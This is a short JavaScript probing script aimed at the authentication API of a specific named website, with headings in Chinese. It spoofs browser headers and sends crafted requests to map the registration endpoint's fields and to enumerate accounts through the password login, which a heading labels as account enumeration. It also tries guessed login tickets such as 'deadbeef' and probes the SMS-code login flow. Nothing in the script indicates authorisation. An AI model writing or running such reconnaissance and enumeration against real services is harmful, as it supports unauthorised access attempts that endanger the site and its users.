
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36';
const P='https://platform.huimengi.com';
async function post(path, body, ct='application/json'){
  try{
    const r=await fetch(P+path,{method:'POST',headers:{'User-Agent':UA,'Content-Type':ct,'Accept':'application/json','Origin':P,'Referer':P+'/login/'},body:ct.includes('json')?JSON.stringify(body):new URLSearchParams(body).toString(),redirect:'manual'});
    const t=await r.text();
    return r.status+' | '+(t.length>200?t.replace(/\s+/g,' ').slice(0,200)+'…':t.replace(/\s+/g,' '));
  }catch(e){return 'ERR '+e.message;}
}
console.log('=== register 字段探测 ===');
for(const b of [{},{phone:'19900000001'},{phone:'19900000001',password:'Test123456'},{phone:'19900000001',password:'Test123456',code:'000000'},{phone:'19900000001',code:'000000'},{phone:'19900000001',smsCode:'000000'},{phone:'19900000001',verifyCode:'000000'},{phone:'19900000001',password:'Test123456',captchaVerification:'x'}]){
  console.log(JSON.stringify(b).padEnd(78), await post('/api/auth/register', b));
}
console.log('\n=== password login（账号枚举）===');
for(const b of [{},{phone:'19900000001',password:'Test123456'},{phone:'13800138000',password:'Test123456'},{phone:'19900000001'}]){
  console.log('pwd  '+JSON.stringify(b).padEnd(60), await post('/api/auth/sso/doLogin/password', b));
}
for(const b of [{},{phone:'19900000001',password:'Test123456'}]){
  console.log('root '+JSON.stringify(b).padEnd(60), await post('/sso/doLogin/password', b));
}
console.log('\n=== doLoginByTicket ===');
for(const b of [{},{ticket:'deadbeef'},{ticket:'0123456789abcdef0123456789abcdef'}]){
  console.log(JSON.stringify(b).padEnd(58), await post('/api/auth/doLoginByTicket', b));
}
console.log('\n=== sms login 顺序 ===');
for(const b of [{},{phone:'19900000001'},{phone:'19900000001',code:'000000'}]){
  console.log(JSON.stringify(b).padEnd(58), await post('/api/auth/sso/doLogin/sms', b));
}
